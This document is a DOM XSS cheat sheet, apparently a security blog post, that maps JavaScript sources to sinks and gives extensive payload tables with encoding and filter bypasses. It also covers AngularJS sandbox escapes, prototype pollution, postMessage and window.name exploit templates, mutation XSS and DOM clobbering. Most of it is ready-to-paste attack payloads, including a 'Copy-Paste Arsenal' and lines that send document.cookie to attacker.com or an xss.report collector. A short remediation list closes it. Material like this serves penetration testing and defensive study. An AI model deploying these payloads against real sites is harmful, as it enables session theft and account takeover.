---
title: "DOM XSS: Source-to-Sink Tracing & Encoding Bypass"
date: 2026-02-24
draft: false
---

# DOM XSS: Source-to-Sink Tracing & Encoding Bypass

> **Severity**: High | **CWE**: CWE-79 | **OWASP**: A03:2021
> **Reference**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## Why DOM XSS Evades Server-Side Sanitization

The payload **never reaches the server**. It goes from a URL source (e.g., `location.hash`) directly to a dangerous sink (e.g., `innerHTML`) entirely in browser JavaScript. Server-side sanitization, WAFs inspecting HTTP traffic, and traditional scanners all miss it.

The attack surface is the JavaScript code itself — you must read it.

---

## Sources and Sinks Reference

### Sources (where attacker data enters)

```javascript
location                        // full URL object
location.href                   // https://target.com/page?q=X#frag
location.search                 // ?q=X
location.hash                   // #frag (most common — not sent to server!)
location.pathname               // /page/X
document.URL
document.documentURI
document.referrer               // controlled via Referer header
window.name                     // persists across navigations!
localStorage.getItem('key')
sessionStorage.getItem('key')
// postMessage:
window.addEventListener('message', e => sink(e.data))
// Network (if attacker influences API response):
fetch('/api').then(r=>r.json()).then(d=>sink(d.field))
```

### Sinks (where execution happens)

```javascript
// ── CRITICAL — direct XSS ──────────────────────────────
element.innerHTML = X           // most common DOM XSS sink
element.outerHTML = X
document.write(X)
document.writeln(X)
element.insertAdjacentHTML('beforeend', X)

// ── URL-based execution ────────────────────────────────
location = X                    // open javascript: URL
location.href = X
location.replace(X)
location.assign(X)
window.open(X)
element.src = X                 // script/iframe src
element.action = X              // form action

// ── Code execution ─────────────────────────────────────
eval(X)
setTimeout(X, 0)                // string form only!
setInterval(X, 0)
new Function(X)()
ScriptElement.text = X

// ── jQuery sinks ───────────────────────────────────────
$(X)                            // if X is HTML string
$().html(X)
$().append(X) / prepend / after / before
$().replaceWith(X)
$.parseHTML(X)
$.globalEval(X)
$(el).attr('href', X)           // when set to javascript:
```

---

## Discovery Checklist

- [ ] Download all JS files: `curl -s https://target.com | grep -oE 'src="[^"]+\.js"' | xargs...`
- [ ] Grep for sources: `grep -rn "location\.hash\|location\.search\|window\.name\|document\.referrer"`
- [ ] Grep for sinks: `grep -rn "innerHTML\|document\.write\|eval(\|insertAdjacentHTML\|setTimeout("`
- [ ] Grep for jQuery: `grep -rn "\.html(\|\.append(\|\.prepend(\|parseHTML\|\$("`
- [ ] Find postMessage handlers: `grep -rn "addEventListener.*message"`
- [ ] Open Burp browser → enable DOM Invader → browse app → view sources/sinks map
- [ ] Test hash injection: `https://target.com/page#<img src=x onerror=alert(1)>`
- [ ] Test search: `?q=<img src=x onerror=alert(1)>` and view source, watch Elements tab
- [ ] DevTools: add breakpoints on `innerHTML` setter to trace execution

---

## Payload Table — All Encoding Variants by Sink

### Sink: `innerHTML` / `outerHTML` — Hash-Based

```
[RAW — paste into URL fragment]
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#<svg onload=alert(1)>
https://target.com/page#<details open ontoggle=alert(1)>
https://target.com/page#<img src=x onerror=alert(document.domain)>
https://target.com/page#<img src=x onerror=alert(document.cookie)>

[URL ENCODED — if app decodeURIComponent before innerHTML]
https://target.com/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
https://target.com/page#%3Csvg%20onload%3Dalert(1)%3E
https://target.com/page#%3Cdetails%20open%20ontoggle%3Dalert(1)%3E

[DOUBLE URL ENCODED — if app decodes twice]
https://target.com/page#%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
https://target.com/page#%253Csvg%2520onload%253Dalert(1)%253E

[HTML ENTITY — if sink goes through another HTML parse step]
https://target.com/page#&#x3c;img src=x onerror=alert(1)&#x3e;
https://target.com/page#&#x003c;img src=1 onerror=confirm(1)&#x003e;

[EVENT HANDLER VALUE — HTML entity encoded]
https://target.com/page#<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
https://target.com/page#<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
https://target.com/page#<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">

[BASE64 EVAL — survives event keyword filters]
https://target.com/page#<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
https://target.com/page#<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

[UNICODE + HEX ESCAPE in event]
https://target.com/page#<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
https://target.com/page#<svg onload="\x61\x6c\x65\x72\x74(1)">

[FROMCHARCODE]
https://target.com/page#<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
```

### Sink: `document.write()` — Search Param

```javascript
// Code: document.write('<input value="' + location.search.slice(1) + '">')

[BREAK OUT OF ATTRIBUTE]
?"><img src=x onerror=alert(1)>
?"><svg onload=alert(1)>
?"><script>alert(1)</script>

[URL ENCODED]
?%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
?%22%3E%3Csvg%20onload%3Dalert(1)%3E

[HTML ENTITY — if app HTML-decodes search before write]
?&#x22;&#x3e;<img src=x onerror=alert(1)>

// Code: document.write('<script>var q="' + location.search + '"</script>')
?";alert(1)//
?"-alert(1)-"
?</script><img src=x onerror=alert(1)>
?%22%3B%61%6c%65%72%74(1)%2F%2F
```

### Sink: `eval()` / `setTimeout()` — Code String

```javascript
// Code: eval(location.hash.slice(1))

[RAW]
#alert(1)
#confirm(1)
#alert(document.domain)
#fetch('https://attacker.com/?c='+document.cookie)

[PARENTHESES BLOCKED — backtick]
#alert`1`
#confirm`document.domain`

[KEYWORD BLOCKED — concat]
#eval('ale'+'rt(1)')
#(window['al'+'ert'])(1)

[FULL ENCODING — unicode escape]
#\u0061\u006c\u0065\u0072\u0074(1)
#\u{61}lert(1)

[HEX ESCAPE]
#\x61\x6c\x65\x72\x74(1)

[BASE64 decoded eval]
#eval(atob('YWxlcnQoMSk='))
#eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))

[FROMCHARCODE]
#eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### Sink: `location.href` / URL Sink

```javascript
// Code: location.href = userControlledValue

[RAW]
javascript:alert(1)
javascript:alert(document.cookie)

[CASE VARIATION]
JavaScript:alert(1)
JAVASCRIPT:alert(1)
JaVaScRiPt:alert(1)

[HTML ENTITY — colon]
javascript&#58;alert(1)
javascript&#x3A;alert(1)
javascript&#x003A;alert(1)

[FULL ENTITY]
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)

[WHITESPACE IN SCHEME]
java	script:alert(1)              ← TAB (0x09)
java%09script:alert(1)
java%0ascript:alert(1)
java%0dscript:alert(1)

[URL ENCODED]
javascript%3Aalert(1)
%6Aavascript:alert(1)
%6a%61%76%61%73%63%72%69%70%74%3aalert(1)

[DOUBLE URL ENCODED]
javascript%253Aalert(1)
%256Aavascript%253Aalert(1)
```

### Sink: jQuery `$()` / `.html()`

```javascript
// Code: $(location.hash)  — jQuery parses HTML if starts with <

[RAW — note leading space forces HTML parse not selector]
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>

[URL ENCODED]
#%20%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
#%20%3Csvg%20onload%3Dalert(1)%3E

// Code: $('body').html(location.search.slice(1))
?<img src=x onerror=alert(1)>
?<svg onload=alert(1)>
?%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

---

## AngularJS Client-Side Template Injection

### Detection

```
Inject: {{7*7}}  — if page shows 49 → AngularJS expression evaluation confirmed
```

### Payloads by AngularJS Version

```javascript
[ANY VERSION — basic test]
{{7*7}}
{{constructor.constructor('alert(1)')()}}

[v1.0.x – 1.1.x]
{{constructor.constructor('alert(1)')()}}
{{{}+{}}}

[v1.2.x]
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

[v1.3.x]
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

[v1.4.x]
{{'a'.constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}

[v1.5.x]
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

[v1.6+ — sandbox removed]
{{$eval.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
{{constructor.constructor('alert(document.cookie)')()}}

[HTML ENTITY ENCODED — for context where {{ is rendered through HTML]
&#x7b;&#x7b;constructor.constructor('alert(1)')()&#x7d;&#x7d;
&#123;&#123;$eval.constructor('alert(1)')()&#125;&#125;

[URL ENCODED — if in URL parameter]
?q=%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D
?q=%7B%7B$eval.constructor('alert(1)')()%7D%7D
```

### CSP Bypass via AngularJS (script-src includes Angular CDN)

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.7.8/angular.js"></script>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

---

## Prototype Pollution → DOM XSS

### Pollution via URL

```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=//attacker.com/script.js
?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
?__proto__[onload]=alert(1)
?__proto__[template]=<img src=x onerror=alert(1)>

[URL ENCODED]
?__proto__%5BinnerHTML%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
?constructor%5Bprototype%5D%5BinnerHTML%5D=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

[DOUBLE URL ENCODED]
?__proto__%255BinnerHTML%255D=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

### Pollution via JSON Body

```json
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"constructor": {"prototype": {"template": "<img src=x onerror=alert(1)>"}}}
{"__proto__": {"src": "//attacker.com/script.js"}}
```

---

## postMessage DOM XSS

### Exploit Template

```html
<!-- Host on attacker.com and send link to victim: -->
<iframe id="t" src="https://target.com/page"></iframe>
<script>
window.onload = function() {
  document.getElementById('t').contentWindow.postMessage(
    '<img src=x onerror=alert(document.domain)>',
    '*'
  );
}
</script>

[ENCODED PAYLOAD via postMessage]
document.getElementById('t').contentWindow.postMessage(
  '&#x3c;img src=x onerror=alert(1)&#x3e;',
  '*'
);

document.getElementById('t').contentWindow.postMessage(
  '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
  '*'
);
```

### Origin Check Bypasses

```javascript
// Vulnerable: e.origin.indexOf('trusted.com') >= 0
// Bypass: https://trusted.com.attacker.com (contains 'trusted.com')
// Bypass: https://attacker.com?x=trusted.com

// Vulnerable: e.origin.startsWith('https://trusted.com')
// Bypass: https://trusted.com.attacker.com

// Vulnerable: e.origin.includes('trusted')
// Bypass: any domain with 'trusted' substring

// Correct: e.origin === 'https://trusted.com'
```

---

## window.name Persistence Attack

```html
<!-- On attacker.com — set window.name then redirect to target: -->
<script>
window.name = '<img src=x onerror=alert(document.cookie)>';
window.location = 'https://target.com/page-using-window-name';
</script>

<!-- Encoded window.name value: -->
<script>
window.name = '<img src=x onerror="fetch(\'https://attacker.com/?c=\'+document.cookie)">';
window.location = 'https://target.com/vulnerable-page';
</script>

<!-- Base64 via window.name: -->
<script>
window.name = 'eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))';
window.location = 'https://target.com/page-with-eval-sink';
</script>
```

---

## Quick Payload Reference — Copy-Paste Arsenal

```html
<!-- HTML Entity Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;
&lt;img src=&quot;x&quot; alt=&quot;&#x22; onerror=&#x22;fetch(&#x27;https://xss.report/c/blitz&#x27;)&#x22;&quot; /&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Unicode Escape (directly usable in eval/setTimeout sinks) -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E

<!-- Dynamic Concatenation -->
<scr + ipt>alert(1)</scr + ipt>

<!-- Spaces in tag -->
<scr ipt>alert(1)</scr ipt>

<!-- SVG wrapper -->
<svg><script>alert(1)</script></svg>

<!-- JS event reassignment -->
<img src="x" onerror="this.src='javascript:alert(1)'">

<!-- Inline focus -->
<input value="XSS" onfocus="alert('XSS')">

<!-- CSS Expression -->
<div style="width:expression(alert(1));">Test</div>

<!-- Body onload -->
<body onload="alert('XSS')">
```

---

## Mutation XSS (mXSS) — Sanitized → Re-Parsed → Malicious

```html
[NAMESPACE CONFUSION — math/SVG]
<math><mtext></table><mglyph><svg><mtext></table><mglyph><style></math><img src onerror=alert(1)>
<math><mtext></table><mglyph><style></math><img src onerror=alert(1)>

[SVG CDATA]
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><script>//<![CDATA[
alert(1)
//]]></script></svg>

[TEMPLATE ELEMENT MUTATION]
<template><div></template><img src=x onerror=alert(1)>

[COMMENT DIFFERENTIAL]
<p id="</p><img src=x onerror=alert(1)>">

[SELECT TEMPLATE — shadow DOM]
<select><template shadowrootmode=open><img src=x onerror=alert(1)></template></select>

[TABLE MUTATION]
<table><td><table></td><script>alert(1)</script></table></table>
```

---

## DOM Clobbering

When attacker can inject HTML but not scripts — clobber JS variables to reach existing dangerous code paths.

```html
[CLOBBER single-level variable 'config']
<a id="config" href="javascript:alert(1)"></a>
<!-- window.config now has a .href property of 'javascript:alert(1)' -->

[CLOBBER two-level 'config.url']
<form id="config"><input id="url" value="javascript:alert(1)"></form>

[HTMLCOLLECTION — two same-id elements create array-like]
<a id="config"></a>
<a id="config" name="url" href="javascript:alert(1)"></a>
<!-- window.config.url → 'javascript:alert(1)' -->

[ENCODED — if injection point encodes angle brackets except in some attributes]
<a id="config" href="&#106;avascript:alert(1)"></a>
<a id="config" href="javascript&#58;alert(1)"></a>
```

---

## Tools

```bash
# DOM Invader (Burp Suite embedded browser):
# Settings → DOM Invader → Enable
# Automatically maps: sources → sinks, generates PoC
# https://portswigger.net/burp/documentation/desktop/tools/dom-invader

# PortSwigger XSS Cheat Sheet:
# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# JSluice — finds URL patterns and sink calls in JS:
go install github.com/BishopFox/jsluice/cmd/jsluice@latest
jsluice urls target.js
jsluice secrets target.js

# grep for sources + sinks:
grep -rn "location\.hash\|location\.search\|window\.name\|document\.referrer" js/
grep -rn "innerHTML\|outerHTML\|document\.write\|eval(\|setTimeout(\|insertAdjacentHTML" js/
grep -rn "addEventListener.*message\|postMessage" js/

# Chrome DevTools — monitor innerHTML:
Object.defineProperty(Element.prototype,'innerHTML',{
  set: function(v){console.trace('innerHTML:',v); this.insertAdjacentHTML('beforeend',v);}
});

# retire.js — find outdated Angular/jQuery:
npm install -g retire && retire --path ./js/

# Prototype pollution scanner:
# https://github.com/BlackFan/client-side-prototype-pollution
```

---

## Remediation Reference

- **`textContent` not `innerHTML`** for inserting text — never use innerHTML with untrusted data
- **`postMessage` origin**: always `e.origin === 'https://exact.com'` — never `indexOf` or `startsWith`
- **Trusted Types API**: `require-trusted-types-for 'script'` in CSP — forces all sink assignments through policies
- **Avoid `eval()`, `setTimeout(string)`, `new Function(string)`**
- **DOMPurify before `innerHTML`**: `el.innerHTML = DOMPurify.sanitize(source)`

*PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet*
